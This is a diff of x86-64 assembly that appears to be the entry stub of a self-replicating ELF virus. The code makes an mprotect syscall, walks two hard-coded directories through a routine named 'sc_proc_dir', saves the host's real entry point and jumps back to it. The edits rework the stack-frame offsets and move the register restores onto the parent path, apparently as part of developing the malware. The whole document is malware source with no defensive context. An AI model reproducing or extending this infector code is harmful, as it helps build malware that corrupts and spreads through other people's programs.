@@ -5,8 +5,8 @@ sc:
 				mov				rbp,					rsp
 
 				and				rsp,					0xfffffffffffffff0
-				mov				rbx,					13 * 8 + 3 * 1024
-				sub				rsp,					rbx					; glob @ +24
+				mov				rbx,					14 * 8 + 3 * 1024
+				sub				rsp,					rbx
 
 				push			rdi
 				push			rsi
@@ -30,30 +30,25 @@ sc:
 				mov				rax,					10
 				syscall
 
-				mov				qword[rel sc_glob],			rsp
-				add				qword[rel sc_glob],			24
+				mov				qword[rel sc_glob],		rsp
 
-				mov				qword[rsp+0x20+24],		sc_end - sc
-				mov				qword[rsp+0x28+24],		sc_data_end - sc_data
-				mov				rax,					qword[rsp+0x20+24]
-				add				rax,					qword[rsp+0x28+24]
-				mov				qword[rsp+0x30+24],		rax
+				mov				qword[rsp+0x20],		sc_end - sc
+				mov				qword[rsp+0x28],		sc_data_end - sc_data
+				mov				rax,					qword[rsp+0x20]
+				add				rax,					qword[rsp+0x28]
+				mov				qword[rsp+0x30],		rax
 				mov				rax,					qword[rel sc_real_entry]
-				mov				qword[rsp+0xc70+24],	rax
+				mov				qword[rsp+0xc70],		rax
 				mov				rax,					qword[rel sc_child]
-				mov				qword[rsp+0xc78+24],	rax
+				mov				qword[rsp+0xc78],		rax
 				mov				rax,					qword[rel sc_entry]
-				mov				qword[rsp+0xc80+24],	rax
+				mov				qword[rsp+0xc80],		rax
 
 				lea				rdi,					[rel sc_dir_1]
 				call			sc_proc_dir
 
 				lea				rdi,					[rel sc_dir_2]
 				call			sc_proc_dir
-
-				pop				rdx
-				pop				rsi
-				pop				rdi
 
 				mov				rax,					qword[rsp+0xc70]
 
@@ -64,6 +59,10 @@ sc:
 				sub				r8,						qword[rsp+0xc80]
 				add				rax,					r8
 .parent:
+				pop				rdx
+				pop				rsi
+				pop				rdi
+
 				mov				rsp,					rbp
 				pop				rbp
 				jmp				rax
